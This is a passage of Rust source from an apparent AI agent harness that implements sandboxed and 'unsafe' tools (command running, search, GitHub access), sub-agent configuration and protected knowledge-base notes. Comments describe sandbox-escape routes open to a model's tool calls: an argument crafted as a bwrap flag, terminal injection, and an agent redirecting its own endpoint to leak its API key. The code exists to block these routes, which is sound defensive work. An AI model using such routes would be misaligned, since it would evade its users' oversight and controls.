            // present instead of failing to launch the sandbox at all over
            // one that isn't.
            "--ro-bind-try",
            "/lib",
            "/lib",
            "--ro-bind-try",
            "/lib64",
            "/lib64",
        ]
        .into_iter()
        .map(String::from),
    );
    a.push("--bind".to_string());
    a.push(cwd.to_string());
    a.push(cwd.to_string());
    a.extend(bwrap_command_tail(command, args));
    a
}

/// Formats the message for when `cmd` itself couldn't be spawned at all
/// (as opposed to running and exiting non-zero). In sandboxed mode `cmd`'s
/// own program is always "bwrap", so a spawn failure here means bwrap
/// itself couldn't be launched (most likely not installed), not that the
/// requested command is missing - that would instead show up as a normal
/// (if unsuccessful) exit from bwrap itself, with its own stderr.
fn command_spawn_error_message(sandboxed: bool, err: &std::io::Error) -> String {
    if sandboxed {
        format!(
            "Failed to launch the sandbox (bwrap): {} - is bubblewrap installed?",
            err
        )
    } else {
        format!("Failed to execute command: {}", err)
    }
}

/// Runs `cmd`, reports its output through `ctx.println`, and returns the
/// JSON result shared by the sandboxed and unsandboxed `run_command`
/// variants.
/// Runs `cmd` to completion, like `Command::output`, but stops it - its
/// whole process group, so `sh -c`'s children too - as soon as `interrupt`
/// says so (Ctrl-C, a stopped task or sub-agent), with `InterruptedError`.
/// It gets no stdin: nobody would answer it.
fn output_interruptibly(
    mut cmd: Command,
    interrupt: &Option<Arc<Mutex<mpsc::Receiver<()>>>>,
) -> Result<std::io::Result<std::process::Output>, Box<dyn Error>> {
    use std::os::unix::process::CommandExt;
    cmd.stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .process_group(0);
    let mut child = match cmd.spawn() {
        Ok(child) => child,
        Err(e) => return Ok(Err(e)),
    };
    let drain = |pipe: Option<Box<dyn Read + Send>>| {
        std::thread::spawn(move || {
            let mut out = Vec::new();
            if let Some(mut pipe) = pipe {
                let _ = pipe.read_to_end(&mut out);
            }
            out
        })
    };
    let stdout = drain(
        child
            .stdout
            .take()
            .map(|p| Box::new(p) as Box<dyn Read + Send>),
    );
    let stderr = drain(
        child
            .stderr
            .take()
            .map(|p| Box::new(p) as Box<dyn Read + Send>),
    );
    loop {
        if let Some(status) = child.try_wait()? {
            return Ok(Ok(std::process::Output {
                status,
                stdout: stdout.join().unwrap_or_default(),
                stderr: stderr.join().unwrap_or_default(),
            }));
        }
        let interrupted = interrupt.as_ref().is_some_and(|rx| {
            rx.lock()
                .unwrap_or_else(|e| e.into_inner())
                .try_recv()
                .is_ok()
        });
        if interrupted {
            // The group is the child's own pid (process_group(0)).
            unsafe {
                libc::kill(-(child.id() as i32), libc::SIGKILL);
            }
            let _ = child.kill();
            let _ = child.wait();
            return Err(Box::new(InterruptedError::new(
                "Operation interrupted by user",
            )));
        }
        std::thread::sleep(Duration::from_millis(50));
    }
}

fn run_command_and_report(
    cmd: Command,
    ctx: &ToolContext,
    command_label: &str,
    sandboxed: bool,
) -> Result<String, Box<dyn Error>> {
    trace!("Executing command: {:?}", cmd);

    let result = match output_interruptibly(cmd, &ctx.interrupt)? {
        Ok(output) => {
            let stdout = String::from_utf8(output.stdout)
                .unwrap_or_else(|_| "<non-utf8 output>".to_string());
            let stderr = String::from_utf8(output.stderr)
                .unwrap_or_else(|_| "<non-utf8 output>".to_string());
            let exit_code = output.status.code();
            let success = output.status.success();

            if success {
                debug!("Successfully run command {}", command_label);
            } else {
                debug!(
                    "Command {} failed with exit code {:?}",
                    command_label, exit_code
                );
            }

            let sandbox_note = if sandboxed { " (sandboxed)" } else { "" };
            if success {
                ctx.println(&format!(
                    "✅ Command executed successfully{}:",
                    sandbox_note
                ));
            } else {
                ctx.println(&format!(
                    "❌ Command failed{} (exit code: {}):",
                    sandbox_note,
                    exit_code.unwrap_or(-1)
                ));
            }
            if !stdout.is_empty() {
                ctx.println("STDOUT:");
                for line in stdout.lines() {
                    ctx.println(&format!("  {}", line));
                }
            }
            if !stderr.is_empty() {
                ctx.println("STDERR:");
                for line in stderr.lines() {
                    ctx.println(&format!("  {}", line));
                }
            }
            if stdout.is_empty() && stderr.is_empty() {
                ctx.println("(no output)");
            }
            CommandResult {
                stdout,
                stderr,
                exit_code,
                success,
            }
        }
        Err(e) => {
            debug!("Failed to execute command {}: {}", command_label, e);
            let message = command_spawn_error_message(sandboxed, &e);
            ctx.println(&format!("ERROR: {}", message));
            CommandResult {
                stdout: String::new(),
                stderr: message,
                exit_code: None,
                success: false,
            }
        }
    };

    let json_result = serde_json::to_string(&result)?;
    Ok(json_result)
}

/// entrypoint for the run_command tool with --unsafe-tools: runs the
/// command directly, with the same access as the faber process itself.
fn tool_run_command(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    debug!("run_command received params: {}", params_str);
    let params: RunCommandParams = serde_json::from_str(params_str)?;

    let mut cmd = if params.args.is_some() || !params.command.contains(' ') {
        let mut c = Command::new(&params.command);
        if let Some(ref args) = params.args {
            c.args(args);
        }
        c
    } else {
        let mut c = Command::new("sh");
        c.arg("-c").arg(&params.command);
        c
    };
    cmd.current_dir(ctx.cwd());

    run_command_and_report(cmd, ctx, &params.command, false)
}

/// Host directories `bwrap_args` makes visible inside the sandbox, besides
/// the current directory.
const SANDBOX_SYSTEM_DIRS: &[&str] = &["/usr", "/lib", "/lib64"];

/// Resolves `command` to an absolute path bwrap can exec directly: an
/// absolute path is kept, a relative one (`./build.sh`,
/// `target/debug/foo`) is joined to `cwd`, and a bare name is looked up on
/// the host's `path_dirs`. bwrap can't do this itself - the sandbox's
/// environment is cleared and its root only has `SANDBOX_SYSTEM_DIRS` and
/// `cwd`. For a PATH hit only the directory is canonicalized (so e.g.
/// `/bin/ls` becomes `/usr/bin/ls` on merged-/usr systems, where `/bin`
/// doesn't exist in the sandbox), never the file itself, which may be a
/// symlink whose name matters (`clang++` -> `clang`).
///
/// The result always starts with `/`, so it can never be mistaken for a
/// bwrap option.
fn resolve_sandboxed_command(
    command: &str,
    cwd: &std::path::Path,
    path_dirs: Option<&std::ffi::OsStr>,
) -> Result<String, String> {
    let resolved = if command.starts_with('/') {
        PathBuf::from(command)
    } else if command.contains('/') {
        // Fold away `.`/`..` so the visibility check below can't be fooled
        // by e.g. `../elsewhere/x`, which only looks like it's under cwd.
        let mut path = PathBuf::new();
        for component in cwd.join(command).components() {
            match component {
                std::path::Component::CurDir => {}
                std::path::Component::ParentDir => {
                    path.pop();
                }
                c => path.push(c),
            }
        }
        path
    } else {
        let found = path_dirs
            .and_then(|dirs| latex_kitty::resolve_in_path_dirs(command, dirs))
            .ok_or_else(|| format!("Command '{}' not found on PATH", command))?;
        match (found.parent(), found.file_name()) {
            (Some(dir), Some(name)) => fs::canonicalize(dir)
                .map(|dir| dir.join(name))
                .unwrap_or(found),
            _ => found,
        }
    };
    let visible = resolved.starts_with(cwd)
        || SANDBOX_SYSTEM_DIRS
            .iter()
            .any(|dir| resolved.starts_with(dir));
    if !visible {
        return Err(format!(
            "Command '{}' resolves to {}, which isn't visible inside the sandbox (only {} and the current directory are)",
            command,
            resolved.display(),
            SANDBOX_SYSTEM_DIRS.join(", ")
        ));
    }
    resolved
        .into_os_string()
        .into_string()
        .map_err(|_| format!("Command '{}' resolves to a non-UTF-8 path", command))
}

/// entrypoint for the run_command tool without --unsafe-tools: runs the
/// command wrapped in a bubblewrap sandbox (see `bwrap_args`) instead of
/// refusing it outright, so basic scripting is still available by default.
fn tool_run_command_sandboxed(
    params_str: &String,
    ctx: &ToolContext,
) -> Result<String, Box<dyn Error>> {
    debug!("run_command (sandboxed) received params: {}", params_str);
    let params: RunCommandParams = serde_json::from_str(params_str)?;

    let cwd = ctx.cwd();

    // Defense in depth on top of the "--" separator in bwrap_args(): command
    // and args come straight from the model's tool call, unvalidated, so a
    // directly-executed command is always resolved to an absolute path
    // first - what stands between the sandbox and a command crafted to
    // look like a bwrap flag (e.g. "--ro-bind" with args ["/", "/", ...])
    // reaching bwrap's argv as one of its own options.
    let direct_exec = params.args.is_some() || !params.command.contains(' ');
    let command = if direct_exec {
        match resolve_sandboxed_command(&params.command, &cwd, std::env::var_os("PATH").as_deref())
        {
            Ok(command) => command,
            Err(message) => {
                ctx.println(&format!("ERROR: {}", message));
                let result = CommandResult {
                    stdout: String::new(),
                    stderr: message,
                    exit_code: None,
                    success: false,
                };
                return Ok(serde_json::to_string(&result)?);
            }
        }
    } else {
        params.command.clone()
    };

    let cwd = cwd.to_str().ok_or("current directory is not valid UTF-8")?;

    let mut cmd = Command::new("bwrap");
    cmd.args(bwrap_args(cwd, &command, params.args.as_deref()));
    cmd.current_dir(cwd);
    // run_command is a one-shot exec-and-capture-output tool, never
    // interactive, so it never needs stdin - and not inheriting it means
    // there's no open file descriptor to faber's own controlling terminal
    // for a sandboxed command to target with TIOCSTI-style injection in the
    // first place, on top of --new-session in bwrap_args() above.
    cmd.stdin(Stdio::null());

    run_command_and_report(cmd, ctx, &params.command, true)
}

#[derive(Deserialize, Debug, Default)]
struct SearchParams {
    pattern: String,
    #[serde(default)]
    path: Option<String>,
    /// Several files or directories at once, besides `path`.
    #[serde(default)]
    paths: Vec<String>,
    /// How many matching lines each file has, rather than the lines.
    #[serde(default)]
    count: bool,
    /// Let the pattern match across lines (ripgrep only).
    #[serde(default)]
    multiline: bool,
    #[serde(default)]
    glob: Option<String>,
    #[serde(default)]
    case_insensitive: bool,
    #[serde(default)]
    fixed_strings: bool,
    #[serde(default)]
    context_lines: Option<u32>,
    #[serde(default)]
    files_only: bool,
    #[serde(default)]
    include_ignored: bool,
    #[serde(default)]
    max_results: Option<usize>,
}

const DEFAULT_SEARCH_MAX_RESULTS: usize = 200;
const MAX_SEARCH_MAX_RESULTS: usize = 2000;
const MAX_SEARCH_CONTEXT_LINES: u32 = 10;

/// Directories the plain-grep fallback skips unless `include_ignored` is
/// set - the usual big, generated ones that ripgrep would skip through
/// `.gitignore`.
const GREP_EXCLUDED_DIRS: &[&str] = &[".git", "target", "node_modules"];

/// Checks that a search `path` stays inside the current directory: relative
/// and without `..`. Defaults to `.`.
/// Arguments for ripgrep. `--sort path` keeps results (and so where they
/// get cut off) the same from one call to the next; `--max-columns` keeps
/// one minified line from swallowing the whole result.
fn rg_search_args(params: &SearchParams, paths: &[String]) -> Vec<String> {
    let mut a: Vec<String> = [
        "--no-config",
        "--color",
        "never",
        "--no-heading",
        "--with-filename",
        "--line-number",
        "--sort",
        "path",
        "--max-columns",
        "500",
        "--max-columns-preview",
    ]
    .into_iter()
    .map(String::from)
    .collect();
    if params.case_insensitive {
        a.push("-i".to_string());
    }
    if params.fixed_strings {
        a.push("-F".to_string());
    }
    if params.multiline {
        a.push("-U".to_string());
    }
    if params.files_only {
        a.push("-l".to_string());
    } else if params.count {
        a.push("--count".to_string());
    } else if let Some(n) = params.context_lines.filter(|n| *n > 0) {
        a.push("-C".to_string());
        a.push(n.min(MAX_SEARCH_CONTEXT_LINES).to_string());
    }
    if let Some(glob) = &params.glob {
        a.push("-g".to_string());
        a.push(glob.clone());
    }
    if params.include_ignored {
        a.push("--no-ignore".to_string());
        a.push("--hidden".to_string());
    }
    a.push("-e".to_string());
    a.push(params.pattern.clone());
    a.push("--".to_string());
    a.extend(paths.iter().cloned());
    a
}

/// Arguments for the plain `grep` fallback, as close to `rg_search_args` as
/// grep allows: extended regexes, binary files skipped, and the usual
/// generated directories excluded instead of honoring `.gitignore`.
fn grep_search_args(params: &SearchParams, paths: &[String]) -> Vec<String> {
    let mut a: Vec<String> = ["-r", "-n", "-I", "-H"]
        .into_iter()
        .map(String::from)
        .collect();
    a.push(if params.fixed_strings { "-F" } else { "-E" }.to_string());
    if params.case_insensitive {
        a.push("-i".to_string());
    }
    if params.files_only {
        a.push("-l".to_string());
    } else if params.count {
        a.push("-c".to_string());
    } else if let Some(n) = params.context_lines.filter(|n| *n > 0) {
        a.push("-C".to_string());
        a.push(n.min(MAX_SEARCH_CONTEXT_LINES).to_string());
    }
    if let Some(glob) = &params.glob {
        a.push(format!("--include={}", glob));
    }
    if !params.include_ignored {
        for dir in GREP_EXCLUDED_DIRS {
            a.push(format!("--exclude-dir={}", dir));
        }
    }
    a.push("-e".to_string());
    a.push(params.pattern.clone());
    a.push("--".to_string());
    a.extend(paths.iter().cloned());
    a
}

/// Keeps the first `max_lines` lines of `output`, returning them and how
/// many were left out.
fn limit_lines(output: &str, max_lines: usize) -> (String, usize) {
    let total = output.lines().count();
    if total <= max_lines {
        return (output.to_string(), 0);
    }
    let kept: Vec<&str> = output.lines().take(max_lines).collect();
    (kept.join("\n") + "\n", total - max_lines)
}

/// entrypoint for the lsp tool without --unsafe-tools: the language
/// server runs sandboxed (see `lsp`).
fn tool_lsp(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    lsp::run(params_str, ctx, true)
}

/// entrypoint for the lsp tool with --unsafe-tools: the language server
/// runs directly on the host.
fn tool_lsp_unsandboxed(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    lsp::run(params_str, ctx, false)
}

/// Builds the bubblewrap argument list for a search: `run_command`'s
/// isolation (cleared environment, no network) and the same empty root
/// with only `/usr` and `/lib*`, but with `cwd` bound *read-only* - a search
/// never needs to write - plus `program` itself if it lives elsewhere (e.g.
/// a ripgrep installed under `~/.cargo/bin`). Symlinks under `cwd` can't
/// lead the search anywhere outside it.
fn bwrap_search_args(cwd: &str, program: &str, args: &[String]) -> Vec<String> {
    let mut a = bwrap_isolation_flags(true);
    a.extend(
        [
            "--tmpfs",
            "/",
            "--ro-bind",
            "/usr",
            "/usr",
            "--ro-bind-try",
            "/lib",
            "/lib",
            "--ro-bind-try",
            "/lib64",
            "/lib64",
            "--ro-bind",
            cwd,
            cwd,
        ]
        .into_iter()
        .map(String::from),
    );
    let program_path = std::path::Path::new(program);
    if !SANDBOX_SYSTEM_DIRS
        .iter()
        .any(|dir| program_path.starts_with(dir))
    {
        a.extend([
            "--ro-bind".to_string(),
            program.to_string(),
            program.to_string(),
        ]);
    }
    a.extend(["--chdir".to_string(), cwd.to_string()]);
    a.extend(bwrap_command_tail(program, Some(args)));
    a
}

/// entrypoint for the grep tool without
/// --unsafe-tools: the search runs sandboxed (see `bwrap_search_args`).
fn tool_grep(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    search_files(params_str, ctx, true)
}

/// entrypoint for the grep tool with --unsafe-tools:
/// the search runs directly on the host.
fn tool_grep_unsandboxed(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    search_files(params_str, ctx, false)
}

/// Searches with ripgrep when it's installed, plain grep otherwise.
/// The grep tool: searches file contents with ripgrep (or grep), in the
/// agent's directory unless given paths. For a `sandboxed` agent it runs
/// in bubblewrap, where only the system's binaries and libraries and that
/// directory exist - that's all that keeps it in: any path it's given
/// outside the directory, or symlink leading out of it, finds nothing.
fn search_files(
    params_str: &String,
    ctx: &ToolContext,
    sandboxed: bool,
) -> Result<String, Box<dyn Error>> {
    let params: SearchParams = serde_json::from_str(params_str)?;
    // Paths inside the directory shown relative to it, as the rest are.
    let mut paths: Vec<String> = params
        .path
        .iter()
        .chain(params.paths.iter())
        .map(|p| ctx.tool_path(p))
        .collect();
    if paths.is_empty() {
        paths.push(".".to_string());
    }
    let max_results = params
        .max_results
        .unwrap_or(DEFAULT_SEARCH_MAX_RESULTS)
        .clamp(1, MAX_SEARCH_MAX_RESULTS);

    let (program, args) = match latex_kitty::resolve_on_path("rg") {
        Some(rg) => (rg, rg_search_args(&params, &paths)),
        None if params.multiline => {
            return Err("multiline needs ripgrep (rg), which isn't installed".into());
        }
        None => (
            latex_kitty::resolve_on_path("grep").ok_or("neither rg nor grep is installed")?,
            grep_search_args(&params, &paths),
        ),
    };
    let cwd = ctx.cwd();
    let mut cmd = if sandboxed {
        let cwd = cwd.to_str().ok_or("current directory is not valid UTF-8")?;
        let program = program
            .to_str()
            .ok_or("search program path is not valid UTF-8")?;
        let mut cmd = Command::new("bwrap");
        cmd.args(bwrap_search_args(cwd, program, &args));
        cmd
    } else {
        let mut cmd = Command::new(&program);
        cmd.args(&args);
        cmd
    };
    cmd.current_dir(&cwd);
    trace!("Executing search command: {:?}", cmd);
    let output = output_interruptibly(cmd, &ctx.interrupt)?.map_err(|e| {
        if sandboxed {
            format!(
                "Failed to launch the sandbox (bwrap): {} - is bubblewrap installed?",
                e
            )
        } else {
            format!("Failed to run {}: {}", program.display(), e)
        }
    })?;

    // Both exit with 1 for "no matches", which isn't an error here. 2 is
    // an error - but rg also returns 2 when it matched and merely couldn't
    // read some files, so only fail if there's nothing to show.
    let stdout = String::from_utf8_lossy(&output.stdout);
    // grep -c lists every file, even those without a match.
    let stdout = if params.count {
        stdout
            .lines()
            .filter(|l| !l.ends_with(":0"))
            .map(|l| format!("{}\n", l))
            .collect::<String>()
            .into()
    } else {
        stdout
    };
    if !output.status.success() && output.status.code() != Some(1) && stdout.is_empty() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        // Only the directory exists in the sandbox: say so, rather than
        // leave "No such file or directory" a puzzle.
        let outside: Vec<&String> = paths
            .iter()
            .filter(|p| std::path::Path::new(p).is_absolute() || p.contains(".."))
            .collect();
        let hint = if sandboxed && !outside.is_empty() && stderr.contains("No such file") {
            format!(
                " - only {} is visible to the search, and {} isn't in it",
                cwd.display(),
                outside
                    .iter()
                    .map(|p| p.as_str())
                    .collect::<Vec<_>>()
                    .join(", ")
            )
        } else {
            String::new()
        };
        return Err(format!(
            "{} failed ({}): {}{}",
            program.display(),
            output.status,
            stderr.trim(),
            hint
        )
        .into());
    }

    let (shown, omitted) = limit_lines(&stdout, max_results);
    ctx.println(&format!(
        "🔍 Search results for pattern '{}':",
        params.pattern
    ));
    if shown.is_empty() {
        ctx.println("(no matches found)");
        return Ok("No matches.".to_string());
    }
    let shown_count = shown.lines().count();
    ctx.println(&format!("{} lines:", shown_count + omitted));
    for line in shown.lines().take(10) {
        ctx.println(&format!("  {}", line));
    }
    if shown_count + omitted > 10 {
        ctx.println(&format!("  ... and {} more", shown_count + omitted - 10));
    }

    let mut result = shown;
    if omitted > 0 {
        result.push_str(&format!(
            "[{} more lines not shown. Narrow the search with `path`, `glob` or a more \
             specific pattern, use `files_only` to list matching files, or raise `max_results`.]\n",
            omitted
        ));
    }
    Ok(result)
}

/// entrypoint for the github_issue tool
/// entrypoint for the github_issue tool: one issue (with its comments if
/// asked), or the issues updated in the last `days`.
fn tool_github_issue(params_str: &String, _ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Params {
        repo: String,
        #[serde(default)]
        number: Option<u64>,
        #[serde(default)]
        comments: bool,
        #[serde(default)]
        days: Option<u64>,
    }
    let params: Params = serde_json::from_str::<Params>(params_str)?;
    match params.number {
        Some(number) => {
            debug!("Fetching GitHub issue: {}/{}", params.repo, number);
            let issue = serde_json::to_value(get_github_issue(&params.repo, number)?)?;
            if !params.comments {
                return Ok(issue.to_string());
            }
            let comments = get_github_issue_comments(&params.repo, number)?;
            Ok(serde_json::json!({"issue": issue, "comments": comments}).to_string())
        }
        None if params.comments => Err("comments needs the issue's number".into()),
        None => {
            let days = params.days.unwrap_or(7);
            debug!(
                "Fetching GitHub issues from {} for the last {} days",
                params.repo, days
            );
            Ok(serde_json::to_string(&get_github_issues(
                &params.repo,
                days,
            )?)?)
        }
    }
}

/// entrypoint for the github_pull_request tool: one pull request (or its
/// patch), or the pull requests updated in the last `days`.
fn tool_github_pull_request(
    params_str: &String,
    _ctx: &ToolContext,
) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Params {
        repo: String,
        #[serde(default)]
        number: Option<u64>,
        #[serde(default)]
        patch: bool,
        #[serde(default)]
        days: Option<u64>,
    }
    let params: Params = serde_json::from_str::<Params>(params_str)?;
    match params.number {
        Some(number) if params.patch => {
            debug!("Fetching GitHub PR patch: {}/{}", params.repo, number);
            get_github_pull_request_patch(&params.repo, number)
        }
        Some(number) => {
            debug!("Fetching GitHub PR: {}/{}", params.repo, number);
            Ok(serde_json::to_string(&get_github_pull_request(
                &params.repo,
                number,
            )?)?)
        }
        None if params.patch => Err("patch needs the pull request's number".into()),
        None => {
            let days = params.days.unwrap_or(7);
            debug!(
                "Fetching GitHub PRs from {} for the last {} days",
                params.repo, days
            );
            Ok(serde_json::to_string(&get_github_pull_requests(
                &params.repo,
                days,
            )?)?)
        }
    }
}

fn tool_agent_create(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        name: String,
        #[serde(default)]
        description: Option<String>,
        #[serde(default)]
        profile: Option<String>,
        #[serde(default)]
        unsafe_tools: Option<bool>,
        #[serde(default)]
        cwd: Option<String>,
    }
    let mut params: Params = serde_json::from_str(params_str)?;
    params.profile = requested_profile(&ctx_profiles(ctx), params.profile.take());
    let db = ctx.db()?;
    let unsafe_tools = child_unsafe(ctx.unsafe_tools, params.unsafe_tools)?;
    let cwd = child_cwd(ctx, params.cwd.as_deref())?;
    db.create_agent(&params.name, params.description.as_deref().unwrap_or(""))?;
    // Its maker's: so that the maker, and only it, may change it later.
    let parent = ctx.agent_name.as_deref();
    if let Err(e) = set_agent_unsafe(db, &params.name, unsafe_tools)
        .and_then(|()| set_agent_cwd(db, &params.name, cwd))
        .and_then(|()| match parent {
            Some(parent) => db.set_agent_parent(&params.name, Some(parent)),
            None => Ok(()),
        })
    {
        let _ = db.delete_agent(&params.name);
        return Err(e);
    }
    let mut result = serde_json::json!({"status": "created", "name": params.name});
    if let Some(name) = &params.profile {
        let profiles = ctx_profiles(ctx);
        let made = find_profile(&profiles, name)
            .map_err(|e| e.into())
            .and_then(|profile| apply_profile(db, &params.name, name, profile));
        if let Err(e) = made {
            let _ = db.delete_agent(&params.name);
            return Err(e);
        }
        result["profile"] = name.clone().into();
    }
    ctx.println(&format!("Agent '{}' created successfully", params.name));
    Ok(result.to_string())
}

fn tool_agent_delete(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        name: String,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let db = ctx.db()?;
    if db.get_agent(&params.name)?.is_some() {
        check_may_change(ctx, db, &params.name)?;
    }
    let deleted = db.delete_agent(&params.name)?;
    if deleted {
        ctx.println(&format!("Agent '{}' deleted", params.name));
        let result = serde_json::json!({"status": "deleted", "name": params.name});
        Ok(result.to_string())
    } else {
        let result = serde_json::json!({"status": "not_found", "name": params.name});
        Ok(result.to_string())
    }
}

fn tool_agent_list(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    let _ = params_str;
    let db = ctx.db()?;
    let agents = db.list_agents()?;
    ctx.println(&format!("Found {} agent(s)", agents.len()));
    for a in &agents {
        ctx.println(&format!("  - {} ({})", a.name, a.description));
    }
    Ok(serde_json::to_string(&agents)?)
}

/// The `agent_data` keys behind an agent's configuration (see
/// `db::get_agent_config`), by the name `agent_configure` uses for each.
const AGENT_CONFIG_KEYS: &[(&str, &str)] = &[
    ("model", "config:model"),
    ("endpoint", "config:endpoint"),
    ("system_prompt", "config:system_prompt"),
];

/// entrypoint for the agent_configure tool: sets or clears an agent's own
/// model, endpoint and system prompt - and nothing else of its stored data.
/// agent_configure for an agent with the unsafe tools.
fn tool_agent_configure(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    agent_configure(params_str, ctx, true)
}

/// agent_configure for one without: no `endpoint`. Pointed at a server of
/// its choosing, an agent would send it its conversation and the API key,
/// and take its replies - tool calls included - as the model's.
fn tool_agent_configure_safe(
    params_str: &String,
    ctx: &ToolContext,
) -> Result<String, Box<dyn Error>> {
    agent_configure(params_str, ctx, false)
}

fn agent_configure(
    params_str: &String,
    ctx: &ToolContext,
    may_set_endpoint: bool,
) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Params {
        agent: String,
        #[serde(default)]
        profile: Option<String>,
        #[serde(default)]
        model: Option<String>,
        #[serde(default)]
        endpoint: Option<String>,
        #[serde(default)]
        system_prompt: Option<String>,
        #[serde(default)]
        unsafe_tools: Option<bool>,
        #[serde(default)]
        cwd: Option<String>,
    }
    let mut params: Params = serde_json::from_str(params_str)?;
    if params.endpoint.is_some() && !may_set_endpoint {
        return Err(
            "unknown field `endpoint`: only an agent with the unsafe tools can set one".into(),
        );
    }
    params.profile = requested_profile(&ctx_profiles(ctx), params.profile.take());
    let db = ctx.db()?;
    if db.get_agent(&params.agent)?.is_none() {
        return Err(format!("no agent named '{}'", params.agent).into());
    }
    check_may_change(ctx, db, &params.agent)?;
    let mut changed = Vec::new();
    if let Some(requested) = params.unsafe_tools {
        set_agent_unsafe(
            db,
            &params.agent,
            child_unsafe(ctx.unsafe_tools, Some(requested))?,
        )?;
        changed.push(format!(
            "unsafe tools {}",
            if requested { "given" } else { "taken away" }
        ));
    }
    if let Some(path) = &params.cwd {
        let cwd = child_cwd(ctx, Some(path))?;
        changed.push(format!("works in {}", cwd.as_deref().unwrap_or("-")));
        set_agent_cwd(db, &params.agent, cwd)?;
    }
    if let Some(name) = &params.profile {
        let profiles = ctx_profiles(ctx);
        apply_profile(db, &params.agent, name, find_profile(&profiles, name)?)?;
        changed.push(format!("settings copied from profile '{}'", name));
    }
    for ((name, key), value) in
        AGENT_CONFIG_KEYS
            .iter()
            .zip([&params.model, &params.endpoint, &params.system_prompt])
    {
        let Some(value) = value else { continue };
        if value.trim().is_empty() {
            db.delete_agent_data(&params.agent, key)?;
            changed.push(format!("{} cleared", name));
        } else {
            db.set_agent_data(&params.agent, key, value)?;
            changed.push(format!("{} set", name));
        }
    }
    if changed.is_empty() {
        return Err(
            "give at least one of profile, model, endpoint, system_prompt, unsafe_tools, cwd"
                .into(),
        );
    }
    ctx.println(&format!("Agent '{}': {}", params.agent, changed.join(", ")));
    let config = db.get_agent_config(&params.agent)?;
    Ok(serde_json::json!({"agent": params.agent, "config": config}).to_string())
}

fn tool_agent_get(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        name: String,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let db = ctx.db()?;
    match db.get_agent(&params.name)? {
        Some(agent) => {
            ctx.println(&format!("Agent '{}': {}", agent.name, agent.description));
            let mut result = serde_json::to_value(&agent)?;
            let mut config = db.get_agent_config(&agent.name)?;
            // Where another agent's requests go, with which key, and what
            // it was told is the user's business, not a safe agent's.
            let own = ctx.agent_name.as_deref() == Some(agent.name.as_str())
                || made_by(db, &agent.name, ctx.agent_name.as_deref())?;
            if !ctx.unsafe_tools && !own {
                config.endpoint = None;
                config.api_key = None;
                config.system_prompt = None;
                config.parameters = None;
            }
            result["config"] = serde_json::to_value(config)?;
            Ok(result.to_string())
        }
        None => {
            let result = serde_json::json!({"error": format!("Agent '{}' not found", params.name)});
            Ok(result.to_string())
        }
    }
}

/// Who the calling agent is, as a knowledge base viewer: one without the
/// unsafe tools doesn't see private notes past the first agent above it
/// that has them (`KbViewer::Scopes`).
fn kb_viewer(ctx: &ToolContext) -> Result<db::KbViewer, Box<dyn Error>> {
    let (Some(agent), false) = (&ctx.agent_name, ctx.unsafe_tools) else {
        return Ok(db::KbViewer::Agent(ctx.agent_name.clone()));
    };
    let db = ctx.db()?;
    let mut scopes = Vec::new();
    for name in db.agent_lineage(agent)? {
        if !scopes.is_empty() && agent_is_unsafe(db, &name)? {
            return Ok(db::KbViewer::Scopes(scopes));
        }
        scopes.push(name);
    }
    Ok(db::KbViewer::Agent(Some(agent.clone())))
}

/// Refuses an agent without the unsafe tools replacing or deleting `note`
/// when the user or an agent with them wrote it: what those write, unsafe
/// agents may act on.
fn check_may_change_note(ctx: &ToolContext, note: &db::KbNote) -> Result<(), Box<dyn Error>> {
    if ctx.unsafe_tools {
        return Ok(());
    }
    let protected = match note.created_by.as_deref() {
        None => true,
        Some(author) => agent_is_unsafe(ctx.db()?, author)?,
    };
    if protected {
        return Err(format!(
            "note #{} was written by the user or an agent with the unsafe tools: an agent \
             without them can't change or delete it - write a note of your own instead",
            note.id
        )
        .into());
    }
    Ok(())
}

/// A note as the model reads it: title, a line of metadata, then the body.
fn format_kb_note(note: &db::KbNote) -> String {
    let mut meta = vec![format!("note #{}", note.id)];
    if !note.tags.is_empty() {
        meta.push(format!("tags: {}", note.tags.join(", ")));
    }
    meta.push(format!("updated {}", note.updated_at));
    if let Some(by) = &note.created_by {
        meta.push(format!("by {}", by));
    }
    if note.agent_name.is_some() {
        meta.push("private".to_string());
    }
    format!(
        "# {}\n({})\n\n{}",
        note.title,
        meta.join(" · "),
        note.body.trim()
    )
}

fn tool_kb_write(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    #[derive(Deserialize)]
    struct Params {
        title: String,
        body: String,
        #[serde(default)]
        tags: Vec<String>,
        #[serde(default)]
        private: bool,
    }
    let params: Params = serde_json::from_str(params_str)?;
    let private_to = if params.private {
        Some(
            ctx.agent_name
                .as_deref()
                .ok_or("private notes need an agent identity; save it as a shared note")?,
        )
    } else {
        None
    };
    // The note it would replace: same title, same scope.
    let scope = db::KbViewer::Scopes(private_to.map(String::from).into_iter().collect());
    if let Some(existing) = ctx.db()?.kb_get_by_title(&params.title, &scope)? {
        if existing.agent_name.as_deref() == private_to {
            check_may_change_note(ctx, &existing)?;
        }
    }
    let (id, created) = ctx.db()?.kb_write(
        &params.title,
        &params.body,
        &params.tags,
        private_to,
        ctx.agent_name.as_deref(),
    )?;
    ctx.println(&format!(
        "📒 {} note #{}: {}",
        if created { "Saved" } else { "Updated" },
        id,
        params.title.trim()
    ));
